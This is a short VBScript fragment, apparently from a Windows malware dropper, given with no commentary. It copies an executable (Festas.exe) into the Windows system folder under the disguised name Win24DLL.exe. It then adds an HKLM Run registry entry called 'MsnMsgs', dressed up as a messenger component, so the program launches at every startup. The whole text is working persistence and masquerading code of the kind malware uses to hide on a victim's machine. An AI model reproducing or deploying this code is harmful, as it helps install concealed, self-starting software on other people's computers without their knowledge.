Set arquivo = CreateObject("Scripting.filesystemobject")
Set registro = CreateObject("WScript.Shell")
if not arquivo.FileExists("c:\windows\system\Win24DLL.exe") then
arquivo.CopyFile registro.ExpandEnvironmentStrings("%Windir%") + "\system32\Sys\root\Festas.exe", registro.ExpandEnvironmentStrings("%Windir%")+"\system\Win24DLL.exe", true
registro.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MsnMsgs", registro.ExpandEnvironmentStrings("%Windir%") + "\system\Win24DLL.exe"
end if
